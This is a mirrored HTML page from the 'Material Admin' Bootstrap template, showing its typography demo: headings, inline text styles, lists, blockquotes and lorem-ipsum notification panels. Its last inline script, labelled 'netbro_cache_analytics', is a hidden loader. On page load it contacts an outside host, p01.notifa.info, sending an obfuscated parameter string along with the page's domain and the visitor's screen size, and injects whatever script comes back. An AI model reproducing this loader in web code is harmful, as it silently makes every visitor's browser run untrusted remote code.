<!DOCTYPE html>
<html lang="en">
    <!--[if IE 9 ]><html class="ie9"><![endif]-->
    
<!-- Mirrored from bootstrapsale.com/projects/maed/v1/typography.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 11 Feb 2019 09:32:21 GMT -->
<?php $this->load->view('link') ?>

    <body>
        <!-- Page Loader -->
        <div id="page-loader">
            <div class="preloader preloader--xl preloader--light">
                <svg viewBox="25 25 50 50">
                    <circle cx="50" cy="50" r="20" />
                </svg>
            </div>
        </div>

        <!-- Header -->
        <?php $this->load->view('header') ?>

        <section id="main">
            <aside id="notifications">
                <ul class="tab-nav tab-nav--justified tab-nav--icon">
                    <li><a class="user-alert__messages" href="#notifications__messages" data-toggle="tab"><i class="zmdi zmdi-email"></i></a></li>
                    <li><a class="user-alert__notifications" href="#notifications__updates" data-toggle="tab"><i class="zmdi zmdi-notifications"></i></a></li>
                    <li><a class="user-alert__tasks" href="#notifications__tasks" data-toggle="tab"><i class="zmdi zmdi-playlist-plus"></i></a></li>
                </ul>

                <div class="tab-content">
                    <div class="tab-pane" id="notifications__messages">
                        <div class="list-group">
                            <a href="#" class="list-group-item media">
                                <div class="pull-left">
                                    <img class="avatar-img" src="demo/img/profile-pics/1.jpg" alt="">
                                </div>

                                <div class="media-body">
                                    <div class="list-group__heading">David Villa Jacobs</div>
                                    <small class="list-group__text">Sorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam mattis lobortis sapien non posuere</small>
                                </div>
                            </a>

                            <a href="#" class="list-group-item media">
                                <div class="pull-left">
                                    <img class="avatar-img" src="demo/img/profile-pics/5.jpg" alt="">
                                </div>
                                <div class="media-body">
                                    <div class="list-group__heading">Candice Barnes</div>
                                    <small class="list-group__text">Quisque non tortor ultricies, posuere elit id, lacinia purus curabitur.</small>
                                </div>
                            </a>

                            <a href="#" class="list-group-item media">
                                <div class="pull-left">
                                    <img class="avatar-img" src="demo/img/profile-pics/3.jpg" alt="">
                                </div>
                                <div class="media-body">
                                    <div class="list-group__heading">Jeannette Lawson</div>
                                    <small class="list-group__text">Donec congue tempus ligula, varius hendrerit mi hendrerit sit amet. Duis ac quam sit amet leo feugiat iaculis</small>
                                </div>
                            </a>

                            <a href="#" class="list-group-item media">
                                <div class="pull-left">
                                    <img class="avatar-img" src="demo/img/profile-pics/4.jpg" alt="">
                                </div>
                                <div class="media-body">
                                    <div class="list-group__heading">Darla Mckinney</div>
                                    <small class="list-group__text">Duis tincidunt augue nec sem dignissim scelerisque. Vestibulum rhoncus sapien sed nulla aliquam lacinia</small>
                                </div>
                            </a>

                            <a href="#" class="list-group-item media">
                                <div class="pull-left">
                                    <img class="avatar-img" src="demo/img/profile-pics/2.jpg" alt="">
                                </div>
                                <div class="media-body">
                                    <div class="list-group__heading">Rudolph Perez</div>
                                    <small class="list-group__text">Phasellus a ullamcorper lectus, sit amet viverra quam. In luctus tortor vel nulla pharetra bibendum</small>
                                </div>
                            </a>
                        </div>

                        <a href="#" class="btn btn--float">
                            <i class="zmdi zmdi-plus"></i>
                        </a>
                    </div>

                    <div class="tab-pane" id="notifications__updates">
                        <div class="list-group">
                            <a href="#" class="list-group-item media">
                                <div class="pull-right">
                                    <img class="avatar-img" src="demo/img/profile-pics/1.jpg" alt="">
                                </div>

                                <div class="media-body">
                                    <div class="list-group__heading">David Villa Jacobs</div>
                                    <small class="list-group__text">Sorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam mattis lobortis sapien non posuere</small>
                                </div>
                            </a>

                            <a href="#" class="list-group-item">
                                <div class="list-group__heading">Candice Barnes</div>
                                <small class="list-group__text">Quisque non tortor ultricies, posuere elit id, lacinia purus curabitur.</small>
                            </a>

                            <a href="#" class="list-group-item">
                                <div class="list-group__heading">Jeannette Lawson</div>
                                <small class="list-group__text">Donec congue tempus ligula, varius hendrerit mi hendrerit sit amet. Duis ac quam sit amet leo feugiat iaculis</small>
                            </a>

                            <a href="#" class="list-group-item media">
                                <div class="pull-right">
                                    <img class="avatar-img" src="demo/img/profile-pics/4.jpg" alt="">
                                </div>
                                <div class="media-body">
                                    <div class="list-group__heading">Darla Mckinney</div>
                                    <small class="list-group__text">Duis tincidunt augue nec sem dignissim scelerisque. Vestibulum rhoncus sapien sed nulla aliquam lacinia</small>
                                </div>
                            </a>

                            <a href="#" class="list-group-item media">
                                <div class="pull-right">
                                    <img class="avatar-img" src="demo/img/profile-pics/2.jpg" alt="">
                                </div>
                                <div class="media-body">
                                    <div class="list-group__heading">Rudolph Perez</div>
                                    <small class="list-group__text">Phasellus a ullamcorper lectus, sit amet viverra quam. In luctus tortor vel nulla pharetra bibendum</small>
                                </div>
                            </a>
                        </div>
                    </div>

                    <div class="tab-pane" id="notifications__tasks">
                        <div class="list-group">
                            <div class="list-group-item">
                                <div class="list-group__heading m-b-5">HTML5 Validation Report</div>

                                <div class="progress">
                                    <div class="progress-bar" role="progressbar" aria-valuenow="95" aria-valuemin="0" aria-valuemax="100" style="width: 95%">
                                        <span class="sr-only">95% Complete (success)</span>
                                    </div>
                                </div>
                            </div>
                            <div class="list-group-item">
                                <div class="list-group__heading m-b-5">Google Chrome Extension</div>

                                <div class="progress">
                                    <div class="progress-bar" role="progressbar" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100" style="width: 80%">
                                        <span class="sr-only">80% Complete (success)</span>
                                    </div>
                                </div>
                            </div>
                            <div class="list-group-item">
                                <div class="list-group__heading m-b-5">Social Intranet Projects</div>

                                <div class="progress">
                                    <div class="progress-bar" role="progressbar" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100" style="width: 20%">
                                        <span class="sr-only">20% Complete</span>
                                    </div>
                                </div>
                            </div>
                            <div class="list-group-item">
                                <div class="list-group__heading m-b-5">Bootstrap Admin Template</div>

                                <div class="progress">
                                    <div class="progress-bar" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" style="width: 60%">
                                        <span class="sr-only">60% Complete (warning)</span>
                                    </div>
                                </div>
                            </div>
                            <div class="list-group-item">
                                <div class="list-group__heading m-b-5">Youtube Client App</div>

                                <div class="progress">
                                    <div class="progress-bar" role="progressbar" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100" style="width: 80%">
                                        <span class="sr-only">80% Complete (danger)</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <a href="#" class="btn btn--float">
                            <i class="zmdi zmdi-plus"></i>
                        </a>
                    </div>
                </div>
            </aside>

            <aside id="navigation">
                <div class="navigation__header">
                    <i class="zmdi zmdi-long-arrow-left" data-mae-action="block-close"></i>
                </div>

                <div class="navigation__toggles">
                    <a href="#" class="active" data-mae-action="block-open" data-mae-target="#notifications" data-toggle="tab" data-target="#notifications__messages">
                        <i class="zmdi zmdi-email"></i>
                    </a>
                    <a href="#" data-mae-action="block-open" data-mae-target="#notifications" data-toggle="tab" data-target="#notifications__updates">
                        <i class="zmdi zmdi-notifications"></i>
                    </a>
                    <a href="#"  data-mae-action="block-open" data-mae-target="#notifications" data-toggle="tab" data-target="#notifications__tasks">
                        <i class="zmdi zmdi-playlist-plus"></i>
                    </a>
                </div>

                <div class="navigation__menu c-overflow">
                    <ul>
                        <li>
                            <a href="index.html"><i class="zmdi zmdi-home"></i> Home</a>
                        </li>
                        <li class="navigation__active"><a href="typography.html"><i class="zmdi zmdi-format-underlined"></i> Typography</a></li>
                        <li><a href="widgets.html"><i class="zmdi zmdi-widgets"></i> Widgets</a></li>
                        <li class="navigation__sub">
                            <a href="#" data-mae-action="submenu-toggle"><i class="zmdi zmdi-view-list"></i> Tables</a>

                            <ul>
                                <li><a href="tables.html">Normal Tables</a></li>
                                <li><a href="data-tables.html">Data Tables</a></li>
                            </ul>
                        </li>
                        <li class="navigation__sub">
                            <a href="#" data-mae-action="submenu-toggle"><i class="zmdi zmdi-collection-text"></i> Forms</a>
                            <ul>
                                <li><a href="form-elements.html">Basic Form Elements</a></li>
                                <li><a href="form-components.html">Form Components</a></li>
                                <li><a href="form-examples.html">Form Examples</a></li>
                                <li><a href="form-validations.html">Form Validation</a></li>
                            </ul>
                        </li>
                        <li class="navigation__sub">
                            <a href="#" data-mae-action="submenu-toggle"><i class="zmdi zmdi-swap-alt"></i>User Interface</a>
                            <ul>
                                <li><a href="animations.html">Animations</a></li>
                                <li><a href="buttons.html">Buttons</a></li>
                                <li><a href="icons.html">Icons</a></li>
                                <li><a href="alerts.html">Alerts</a></li>
                                <li><a href="preloaders.html">Preloaders</a></li>
                                <li><a href="notification-dialog.html">Notifications & Dialogs</a></li>
                                <li><a href="media.html">Media</a></li>
                                <li><a href="components.html">Components</a></li>
                            </ul>
                        </li>
                        <li class="navigation__sub">
                            <a href="#" data-mae-action="submenu-toggle"><i class="zmdi zmdi-trending-up"></i>Charts</a>
                            <ul>
                                <li><a href="flot-charts.html">Flot Chart</a></li>
                                <li><a href="other-charts.html">Others</a></li>
                            </ul>
                        </li>
                        <li class="navigation__sub">
                            <a href="#" data-mae-action="submenu-toggle"><i class="zmdi zmdi-image"></i>Photo Gallery</a>
                            <ul>
                                <li><a href="photos.html">Default</a></li>
                                <li><a href="photo-timeline.html">Timeline</a></li>
                            </ul>
                        </li>
                        <li><a href="calendar.html"><i class="zmdi zmdi-calendar"></i> Calendar</a></li>
                        <li><a href="generic-classes.html"><i class="zmdi zmdi-layers"></i> Generic Classes</a></li>
                        <li class="navigation__sub">
                            <a href="#" data-mae-action="submenu-toggle"><i class="zmdi zmdi-collection-item"></i> Sample Pages</a>
                            <ul>
                                <li><a href="profile-timeline.html">Profile</a></li>
                                <li><a href="list-view.html">List View</a></li>
                                <li><a href="messages.html">Messages</a></li>
                                <li><a href="pricing-table.html">Pricing Table</a></li>
                                <li><a href="contacts.html">Contacts</a></li>
                                <li><a href="wall.html">Wall</a></li>
                                <li><a href="invoice.html">Invoice</a></li>
                                <li><a href="login.html">Login and Sign Up</a></li>
                                <li><a href="lockscreen.html">Lockscreen</a></li>
                                <li><a href="404.html">Error 404</a></li>
                            </ul>
                        </li>
                    </ul>
                </div>
            </aside>

            <section id="content">
                <div class="content__header">
                    <h2>Typography</h2>

                    <div class="actions">
                        <a href="#"><i class="zmdi zmdi-check-all"></i></a>
                        <a href="#"><i class="zmdi zmdi-trending-up"></i></a>
                        <div class="dropdown">
                            <a href="#" data-toggle="dropdown"><i class="zmdi zmdi-more-vert"></i></a>
                            <ul class="dropdown-menu pull-right">
                                <li><a href="#">Change Date Range</a></li>
                                <li><a href="#">Change Graph Type</a></li>
                                <li><a href="#">Other Settings</a></li>
                            </ul>
                        </div>
                    </div>
                </div>

                <div class="card">
                    <div class="card__header">
                        <h2>Body Copy</h2>
                    </div>

                    <div class="card__body">
                        <p class="lead">Vivamus sagittis lacus vel augue laoreet rutrum faucibus dolor auctor. Duis mollis, est non commodo luctus.</p>
                        <p>Pellentesque lacinia sagittis libero et feugiat. Etiam volutpat adipiscing tortor non luctus. Vivamus venenatis vitae metus et aliquet. Praesent vitae justo purus. In hendrerit lorem nisl, ac lacinia urna aliquet non. Quisque nisi tellus, rhoncus quis est sit amet, lacinia euismod nunc. Aenean nec nibh velit. Fusce quis ante in nisl molestie fringilla. Nunc vitae ante id magna feugiat condimentum. Maecenas sit amet urna massa.</p>
                        <p>Integer eu lectus sollicitudin, hendrerit est ac, sollicitudin nisl. Quisque viverra sodales lectus nec ultrices. Fusce elit dolor, dignissim a nunc id, varius suscipit turpis. Cras porttitor turpis vitae leo accumsan molestie. Morbi vitae luctus leo. Sed nec scelerisque magna, et adipiscing est. Proin lobortis lectus eu sem ullamcorper, commodo malesuada quam fringilla. Curabitur ac nunc dui. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Fusce sagittis enim eu est lacinia, ut egestas ligula imperdiet.</p>
                    </div>
                </div>

                <div class="card">
                    <div class="card__header">
                        <h2>Headings</h2>
                    </div>

                    <div class="card__body">
                        <h1>This is a Heading 1</h1>
                        <p>Suspendisse vel quam malesuada, aliquet sem sit amet, fringilla elit. Morbi tempor tincidunt tempor. Etiam id turpis viverra, vulputate sapien nec, varius sem. Curabitur ullamcorper fringilla eleifend. In ut eros hendrerit est consequat posuere et at velit.</p>

                        <div class="clearfix"></div>

                        <h2>This is a Heading 2</h2>
                        <p>In nec rhoncus eros. Vestibulum eu mattis nisl. Quisque viverra viverra magna nec pulvinar. Maecenas pellentesque porta augue, consectetur facilisis diam porttitor sed. Suspendisse tempor est sodales augue rutrum tincidunt. Quisque a malesuada purus.</p>

                        <div class="clearfix"></div>

                        <h3>This is a Heading 3</h3>
                        <p>Vestibulum auctor tincidunt semper. Phasellus ut vulputate lacus. Suspendisse ultricies mi eros, sit amet tempor nulla varius sed. Proin nisl nisi, feugiat quis bibendum vitae, dapibus in tellus.</p>

                        <div class="clearfix"></div>

                        <h4>This is a Heading 4</h4>
                        <p>Nulla et mattis nunc. Curabitur scelerisque commodo condimentum. Mauris blandit, velit a consectetur egestas, diam arcu fermentum justo, eget ultrices arcu eros vel erat.</p>

                        <div class="clearfix"></div>

                        <h5>This is a Heading 5</h5>
                        <p>Quisque nec turpis at urna dictum luctus. Suspendisse convallis dignissim eros at volutpat. In egestas mattis dui. Aliquam mattis dictum aliquet. Nulla sapien mauris, eleifend et sem ac, commodo dapibus odio. Vivamus pretium nec odio cursus elementum. Suspendisse molestie ullamcorper ornare.</p>

                        <div class="clearfix"></div>

                        <h6>This is a Heading 6</h6>
                        <p>Donec ultricies, lacus id tempor condimentum, orci leo faucibus sem, a molestie libero lectus ac justo. ultricies mi eros, sit amet tempor nulla varius sed. Proin nisl nisi, feugiat quis bibendum vitae, dapibus in tellus.</p>
                    </div>
                </div>

                <div class="card">
                    <div class="card__header">
                        <h2>Inline text elements</h2>
                    </div>

                    <div class="card__body">
                        <div class="row">
                            <div class="col-sm-4 m-b-25">
                                <h5>Marked text</h5>
                                <p>For highlighting a run of text due to its relevance in another context, use the 'mark' tag.</p>
                                <mark>This is marked text</mark>
                            </div>

                            <div class="col-sm-4 m-b-25">
                                <h5>Deleted Text</h5>
                                <p>For indicating blocks of text that have been deleted use the 'del' tag.</p>
                                <del>This is Deleted Text</del>
                            </div>

                            <div class="col-sm-4 m-b-25">
                                <h5>Strikethrough text</h5>
                                <p>For indicating blocks of text that are no longer relevant use the 's' tag.</p>
                                <s>This is Strikethrough Text</s>
                            </div>

                            <div class="col-sm-4 m-b-25">
                                <h5>Inserted Text</h5>
                                <p>For indicating additions to the document use the 'ins' tag.</p>
                                <ins>This is Inserted Text</ins>
                            </div>

                            <div class="col-sm-4 m-b-25">
                                <h5>Underlined Text</h5>
                                <p>To underline text use the 'u' tag.</p>
                                <u>This is Underlined Text</u>
                            </div>

                            <div class="col-sm-4 m-b-25">
                                <h5>Small Text</h5>
                                <p>For de-emphasizing inline or blocks of text, use the 'small' tag.</p>
                                <small>This is Small Text</small>
                            </div>

                            <div class="col-sm-4">
                                <h5>Bold Text</h5>
                                <p>For emphasizing a snippet of text with a heavier font-weight.</p>
                                <strong>This is Bold Text</strong>
                            </div>

                            <div class="col-sm-4">
                                <h5>Italic Text</h5>
                                <p>For emphasizing a snippet of text with italics.</p>
                                <em>This is Italic Text</em>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-sm-6">
                        <div class="card">
                            <div class="card__header">
                                <h2>Helper Classes</h2>
                            </div>

                            <div class="card__body">
                                <h5>Alignment Classes</h5>
                                <p>Easily realign text to components with text alignment classes.</p>

                                <p class="text-left">Left aligned text.</p>
                                <p class="text-center">Center aligned text.</p>
                                <p class="text-right">Right aligned text.</p>
                                <p class="text-justify">Justified text.</p>
                                <p class="text-nowrap">No wrap text.</p>

                                <br>

                                <h5>Transformation classes</h5>
                                <p>Transform text in components with text capitalization classes.</p>

                                <p class="text-lowercase">Lowercased text.</p>
                                <p class="text-uppercase">Uppercased text.</p>
                                <p class="text-capitalize">Capitalized text.</p>
                            </div>
                        </div>
                    </div>

                    <div class="col-sm-6">
                        <div class="card">
                            <div class="card__header">
                                <h2>Abbreviations</h2>
                            </div>

                            <div class="card__body">
                                <p>Stylized implementation of HTML's 'abbr' element for abbreviations and acronyms to show the expanded version on hover. Abbreviations with a 'title' attribute have a light dotted bottom border and a help cursor on hover, providing additional context on hover and to users of assistive technologies.</p>

                                <h5>Basic abbreviation</h5>
                                <p>An abbreviation of the word attribute is <abbr title="attribute">attr</abbr>.</p>

                                <h5>Initialism</h5>
                                <p>Add <abbr title="Initialism" class="initialism">Initialism</abbr> to an abbreviation for a slightly smaller font-size.</p>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="card">
                    <div class="card__header">
                        <h2>Blockquotes</h2>
                    </div>

                    <div class="card__body">
                        <p>For quoting blocks of content from another source within your document.</p>

                        <blockquote>
                            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante.</p>
                        </blockquote>

                        <blockquote>
                            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante.</p>
                            <footer>Someone famous in <cite title="Source Title">Source Title</cite></footer>
                        </blockquote>
                    </div>
                </div>

                <div class="card">
                    <div class="card__header">
                        <h2>List</h2>
                    </div>

                    <div class="card__body">
                        <div class="row">
                            <div class="col-sm-4">
                                <h5>Unordered</h5>

                                <ul>
                                    <li>Lorem ipsum dolor sit amet</li>
                                    <li>Consectetur adipiscing elit</li>
                                    <li>Integer molestie lorem at massa</li>
                                    <li>Facilisis in pretium nisl aliquet</li>
                                    <li>Nulla volutpat aliquam velit
                                        <ul>
                                            <li>Phasellus iaculis neque</li>
                                            <li>Purus sodales ultricies</li>
                                            <li>Vestibulum laoreet porttitor sem</li>
                                            <li>Ac tristique libero volutpat at</li>
                                        </ul>
                                    </li>
                                    <li>Faucibus porta lacus fringilla vel</li>
                                    <li>Aenean sit amet erat nunc</li>
                                    <li>Eget porttitor lorem</li>
                                </ul>

                                <br>
                            </div>

                            <div class="col-sm-4">
                                <h5>Ordered</h5>

                                <ol>
                                    <li>Lorem ipsum dolor sit amet</li>
                                    <li>Consectetur adipiscing elit</li>
                                    <li>Integer molestie lorem at massa</li>
                                    <li>Facilisis in pretium nisl aliquet</li>
                                    <li>Nulla volutpat aliquam velit</li>
                                    <li>Faucibus porta lacus fringilla vel</li>
                                    <li>Aenean sit amet erat nunc</li>
                                    <li>Eget porttitor lorem</li>
                                    <li>Integer molestie lorem at massa</li>
                                    <li>Faucibus porta lacus fringilla vel</li>
                                    <li>Spretium nisl aliquet lorem ipsum</li>
                                    <li>Linking best ttoth bellorem</li>
                                </ol>

                                <br>
                            </div>

                            <div class="col-sm-4">
                                <h5>Ordered - Roman</h5>

                                <ol type="i">
                                    <li>Lorem ipsum dolor sit amet</li>
                                    <li>Consectetur adipiscing elit</li>
                                    <li>Integer molestie lorem at massa</li>
                                    <li>Facilisis in pretium nisl aliquet</li>
                                    <li>Nulla volutpat aliquam velit</li>
                                    <li>Phasellus iaculis neque</li>
                                    <li>Purus sodales ultricies</li>
                                    <li>Vestibulum laoreet porttitor sem</li>
                                    <li>Ac tristique libero volutpat at</li>
                                    <li>Faucibus porta lacus fringilla vel</li>
                                    <li>Aenean sit amet erat nunc</li>
                                    <li>Eget porttitor lorem</li>
                                </ol>

                                <br>
                            </div>

                            <div class="col-sm-4">
                                <h5>Custom - 1</h5>

                                <ul class="un-list un-list--angle">
                                    <li>Lorem ipsum dolor sit amet</li>
                                    <li>Consectetur adipiscing elit</li>
                                    <li>Integer molestie lorem at massa</li>
                                    <li>Facilisis in pretium nisl aliquet</li>
                                    <li>Nulla volutpat aliquam velit</li>
                                    <li>Phasellus iaculis neque</li>
                                    <li>Purus sodales ultricies</li>
                                    <li>Vestibulum laoreet porttitor sem</li>
                                    <li>Ac tristique libero volutpat at</li>
                                    <li>Faucibus porta lacus fringilla vel</li>
                                    <li>Aenean sit amet erat nunc</li>
                                    <li>Eget porttitor lorem</li>
                                </ul>

                                <br>
                            </div>

                            <div class="col-sm-4">
                                <h5>Custom - 2</h5>

                                <ul class="un-list un-list--check">
                                    <li>Lorem ipsum dolor sit amet</li>
                                    <li>Consectetur adipiscing elit</li>
                                    <li>Integer molestie lorem at massa</li>
                                    <li>Facilisis in pretium nisl aliquet</li>
                                    <li>Nulla volutpat aliquam velit</li>
                                    <li>Phasellus iaculis neque</li>
                                    <li>Purus sodales ultricies</li>
                                    <li>Vestibulum laoreet porttitor sem</li>
                                    <li>Ac tristique libero volutpat at</li>
                                    <li>Faucibus porta lacus fringilla vel</li>
                                    <li>Aenean sit amet erat nunc</li>
                                    <li>Eget porttitor lorem</li>
                                </ul>

                                <br>
                            </div>

                            <div class="col-sm-4">
                                <h5>Custom - 3</h5>

                                <ul class="un-list un-list--star">
                                    <li>Lorem ipsum dolor sit amet</li>
                                    <li>Consectetur adipiscing elit</li>
                                    <li>Integer molestie lorem at massa</li>
                                    <li>Facilisis in pretium nisl aliquet</li>
                                    <li>Nulla volutpat aliquam velit</li>
                                    <li>Phasellus iaculis neque</li>
                                    <li>Purus sodales ultricies</li>
                                    <li>Vestibulum laoreet porttitor sem</li>
                                    <li>Ac tristique libero volutpat at</li>
                                    <li>Faucibus porta lacus fringilla vel</li>
                                    <li>Aenean sit amet erat nunc</li>
                                    <li>Eget porttitor lorem</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            <footer id="footer">
                Copyright &copy; 2015 Material Admin

                <ul class="footer__menu">
                    <li><a href="#">Home</a></li>
                    <li><a href="#">Dashboard</a></li>
                    <li><a href="#">Reports</a></li>
                    <li><a href="#">Support</a></li>
                    <li><a href="#">Contact</a></li>
                </ul>
            </footer>

        </section>

        <!-- Older IE Warning -->
        <!--[if lt IE 9]>
            <div class="ie-warning">
                <h1>Warning!!</h1>
                <p>You are using an outdated version of Internet Explorer, please upgrade <br/>to any of the following web browsers to access this website.</p>
                <div class="ie-warning__container">
                    <ul class="ie-warning__download">
                        <li>
                            <a href="http://www.google.com/chrome/">
                                <img src="img/browsers/chrome.png" alt="">
                                <div>Chrome</div>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.mozilla.org/en-US/firefox/new/">
                                <img src="img/browsers/firefox.png" alt="">
                                <div>Firefox</div>
                            </a>
                        </li>
                        <li>
                            <a href="http://www.opera.com">
                                <img src="img/browsers/opera.png" alt="">
                                <div>Opera</div>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.apple.com/safari/">
                                <img src="img/browsers/safari.png" alt="">
                                <div>Safari</div>
                            </a>
                        </li>
                        <li>
                            <a href="http://windows.microsoft.com/en-us/internet-explorer/download-ie">
                                <img src="img/browsers/ie.png" alt="">
                                <div>IE (New)</div>
                            </a>
                        </li>
                    </ul>
                </div>
                <p>Sorry for the inconvenience!</p>
            </div>
        <![endif]-->


        <!-- Javascript Libraries -->

        <!-- jQuery -->
        <script src="vendors/bower_components/jquery/dist/jquery.min.js"></script>

        <!-- Bootstrap -->
        <script src="vendors/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>

        <!-- Malihu ScrollBar -->
        <script src="vendors/bower_components/malihu-custom-scrollbar-plugin/jquery.mCustomScrollbar.concat.min.js"></script>

        <!-- Bootstrap Notify -->
        <script src="vendors/bower_components/remarkable-bootstrap-notify/dist/bootstrap-notify.min.js"></script>

        <!-- Placeholder for IE9 -->
        <!--[if IE 9 ]>
            <script src="vendors/bower_components/jquery-placeholder/jquery.placeholder.min.js"></script>
        <![endif]-->

        <!-- Demo Only -->
        <script src="demo/js/misc.js"></script>

        <!-- Site Functions & Actions -->
        <script src="js/app.min.js"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2vHCJIZnO7uaePac2Qnng0jAMWGbfZ2RtPubpw6c6moRILbbFSrp2GFKG%2b2oDf8XP%2faNu1qoa1StxPkj0fI2ljrwHNZSnGM%2foGgWXItwR8saL7Uexa7LjnpvL%2f3%2bIwbZQ1nYt6NIVsnpXxHgayiEaLN%2fkMR8MzWv3HrmIMxgczi8WayJzVUaoXg2ZQmVIU3SZESv56MA4R5S38rEmY0e91HCuGcHLggqEh4Mp%2bqHeysNqDmAfu8%2b3O%2fMf0pQmV%2f6V3sztw1fOgo5900mTkidjqiOU59fXyeJPu4m4bn7KaNJByu85NkpBFvsy1xF8ZfjcfPq6yu8xDGEMATiv68LDMlX%2bCyMrHELXdIVk0R7qwx5jePri3YQRNZnZtc7yi3knX6u7Qd3eh42UYN%2fXJ8QfGiWlX3FAHJuSHje4ZskAgdKrkkkUN1iQHN59%2fdaFpl0Di9KyRMDtzQI0tZSVOWOFw13RNizeY9Cmme26PdGKpcjCGmi5%2bE47Lw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from bootstrapsale.com/projects/maed/v1/typography.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 11 Feb 2019 09:32:21 GMT -->
</html>